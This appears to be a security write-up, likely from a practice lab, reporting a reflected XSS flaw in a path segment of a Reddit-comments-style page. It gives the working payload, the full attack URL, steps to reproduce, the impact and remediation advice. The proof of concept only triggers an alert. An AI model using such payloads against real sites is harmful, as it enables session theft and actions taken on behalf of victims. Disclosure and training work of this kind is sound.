# Cross-Site Scripting (XSS) in Reddit Comments

## Summary

I identified a Cross-Site Scripting (XSS) vulnerability in the user-controlled `POST_ID` segment of the application's URL.

The application reflects the value of the `POST_ID` directly into an unquoted HTML attribute without properly encoding special characters. By appending a crafted payload to the `POST_ID`, it is possible to inject arbitrary HTML and JavaScript that executes in the victim's browser.

An attacker can craft a malicious URL and trick a victim into opening it. When the page loads, the injected JavaScript executes in the context of the vulnerable application.


## Vulnerability Type

**Cross-Site Scripting (XSS)**

## Vulnerable Input

```text
POST_ID 
```

## Vulnerable URL

```text
https://kzlabs.in/59.php/svc/shreddit/api/comments/askreddit/t3_u9po1l"><img%20src=x%20onerror=alert(1)>
```

## Steps to Reproduce

1. Open the Reddit Comments page.

2. Append the following payload directly after the `POST_ID` in the URL path:

   ```html
   "><img src=x onerror=alert(1)>
   ```

3. Open the following URL:

   ```text
   https://kzlabs.in/59.php/svc/shreddit/api/comments/askreddit/t3_u9po1l"><img%20src=x%20onerror=alert(1)>
   ```

4. Observe that the appended input is reflected into an unquoted HTML attribute without proper output encoding.

5. The injected `<img>` element is rendered, causing its `onerror` event to execute.

6. An `alert(1)` popup appears, confirming successful JavaScript execution.

## Payload Used

```html
"><img src=x onerror=alert(1)>
```

## Proof of Concept

The payload escapes the original HTML attribute, injects an `<img>` element, and uses the `onerror` event to execute JavaScript.

When the browser fails to load the image, it executes:

```javascript
alert(1)
```

This confirms that arbitrary JavaScript execution is possible.

<img width="1917" height="471" alt="image" src="https://github.com/user-attachments/assets/d715af0e-ebb3-4cf4-8372-e6e1b4df9ead" />


## Impact

An attacker can craft a malicious link that, when opened by a victim, executes arbitrary JavaScript in the context of the vulnerable website. This could allow an attacker to manipulate page content, steal sensitive user information, or perform actions on behalf of an authenticated user.

## Recommendation

To mitigate this vulnerability:

- Use `htmlspecialchars()` (or an equivalent output-encoding function) before rendering user-controlled data in HTML.
- Filter or sanitize HTML tags to prevent malicious markup from being injected.
- Filter or restrict dangerous JavaScript methods such as `alert()`, `confirm()`, and `prompt()` where appropriate.
- Deploy a Web Application Firewall (WAF), such as Cloudflare WAF, to help detect and block malicious XSS payloads.
